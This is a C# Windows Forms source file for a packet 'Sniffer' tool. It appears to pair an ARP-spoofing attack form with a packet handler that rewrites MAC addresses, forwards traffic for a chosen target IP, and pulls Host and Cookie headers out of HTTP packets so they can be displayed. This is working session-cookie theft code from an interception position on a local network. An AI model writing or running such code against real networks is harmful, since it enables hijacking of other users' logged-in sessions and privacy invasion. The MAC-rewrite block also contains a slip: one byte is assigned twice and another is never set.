using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using SharpPcap;
using System.Runtime.InteropServices;
using System.Net;
using System.Net.NetworkInformation;
using PacketDotNet;
using System.Threading;
namespace Sniffer
{
    
   
    public partial class Main : Form
    {
        
        CaptureDeviceList selectedDevices;
        BaseInformation baseInformation;
        Struct_Packet packet = new Struct_Packet();
  



        public Main()
        {
            InitializeComponent();
            selectedDevices = CaptureDeviceList.Instance;
            baseInformation = new BaseInformation();
            baseInformation.getDefaultGateway();
            setlistView();  
        }
        private void Icd_OnPacketArrival(object sender, CaptureEventArgs e)
        {
            IPAddress srcIP;
            IPAddress dstIP;
            StringBuilder sb_Site = new StringBuilder();
            StringBuilder sb_packetSender = new StringBuilder();
            Packet tcpPacket;
            TcpPacket Packetinfo;
           
            RawCapture packet = e.Packet;
            
            //리다이렉트를 하는데
            if (e.Packet.Data.Length < 29) return;
            packet.Data[0] = 0x2c;
            packet.Data[1] = 0x21;
            packet.Data[2] = 0x72;
            packet.Data[3] = 0x93;
            packet.Data[4] = 0xdf;
            packet.Data[5] = 0x00;
            packet.Data[6] = 0x48;
            packet.Data[7] = 0x45;
            packet.Data[8] = 0x20;
            packet.Data[9] = 0x81;
            packet.Data[9] = 0x23;
            packet.Data[10] = 0x8d;
            var addr = IPAddress.Parse(packet.Data[26] + "." + packet.Data[27] + "." +packet.Data[28] + "." +packet.Data[29]);
            if (BaseInformation.targetIpAddress == addr.ToString())
            {
                BaseInformation.captureDevice.SendPacket(packet.Data);
            }
            else
            {
                return;
            }
            try
            {
                tcpPacket = Packet.ParsePacket(packet.LinkLayerType, packet.Data);
                Packetinfo = TcpPacket.GetEncapsulated(tcpPacket);
            }
            catch (Exception)
            {
                return;
            }
            
            if (Packetinfo != null) //tcp일 경우 데이터 정보들을 뽑아 낸다.
            {
                var ipPacket = (PacketDotNet.IpPacket)Packetinfo.ParentPacket;
                srcIP = ipPacket.SourceAddress;
                dstIP = ipPacket.DestinationAddress;
            }
            else
            {
                return;
            }
            for (int i = 0; i < packet.Data.Length - 10; i++)
                {
                    if (packet.Data[i] == 'C' && packet.Data[i + 1] == 'o' && packet.Data[i + 2] == 'o' && packet.Data[i + 3] == 'k' && packet.Data[i + 4] == 'i' && packet.Data[i + 5] == 'e')
                    {
                        for (int j = 0; j < packet.Data.Length - 10; j++)
                        {
                            if (packet.Data[j] == 'H' && packet.Data[j + 1] == 'o' && packet.Data[j + 2] == 's' && packet.Data[j + 3] == 't')
                            {
                                sb_Site = new System.Text.StringBuilder();
                                sb_Site.Append(System.Text.Encoding.ASCII.GetChars(packet.Data, j, 20));
                                break;

                            }
                        }
                        ListViewItem lvi = new ListViewItem();
                        System.Text.StringBuilder sb_Cookie = new System.Text.StringBuilder();
                        System.Text.StringBuilder sb_SourceIp = new System.Text.StringBuilder();
                        sb_Cookie.Append(System.Text.Encoding.ASCII.GetChars(packet.Data, i + 7, packet.Data.Length - i - 7));
                        sb_SourceIp.Append(System.Text.Encoding.ASCII.GetChars(packet.Data, 26, 4));

                        lvi.SubItems.Add(srcIP.ToString());
                        lvi.SubItems.Add(dstIP.ToString());
                        lvi.SubItems.Add(sb_Site.ToString());
                        lvi.SubItems.Add(sb_Cookie.ToString());
                        sb_Cookie.Clear();

                        if (listView.InvokeRequired)
                            listView.Invoke(new MethodInvoker(delegate
                            {
                                listView.Items.Add(lvi);

                            }));
                        else
                            listView.Items.Add(lvi);
                    }
                }
        }
        private void btn_capture_option_Click(object sender, EventArgs e)
        {
            SelectDevices selectedDeviceForm = new SelectDevices();  
            if (selectedDeviceForm.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                BaseInformation.captureDevice = selectedDevices[selectedDeviceForm.returnDeviceIndex];  //선택한 네트워크 인터페이스를 가져온다.
                BaseInformation.captureDevice.Open(DeviceMode.Normal);  //선택한 네트워크 인터페이스를 오픈함
                BaseInformation.myMacAddress = BaseInformation.captureDevice.MacAddress.ToString(); //선택한 네트워크 인터페이스의 맥주소를 가져온다.
            }

        }
       
       
        private void btn_capture_start_Click(object sender, EventArgs e)
        {

            BaseInformation.captureDevice.OnPacketArrival += Icd_OnPacketArrival;
            BaseInformation.captureDevice.StartCapture();
        }

        private void listView_DoubleClick(object sender, EventArgs e)
        {
            int indexnum;
            indexnum = listView.FocusedItem.Index;
            string test = listView.Items[indexnum].SubItems[4].Text;
            MessageBox.Show(test);
        }

        private void btn_arp_attack_Click(object sender, EventArgs e)       
        {
            AttackList AttackListForm = new AttackList();
            AttackListForm.Show();
   
        }
        private void setlistView()
        {
            listView.View = View.Details;
            listView.BeginUpdate();
            listView.Columns.Add("No.");
            listView.Columns.Add("Source");
            listView.Columns.Add("Destination");
            listView.Columns.Add("Sites");
            listView.Columns.Add("Cookie");
        }
    }
}
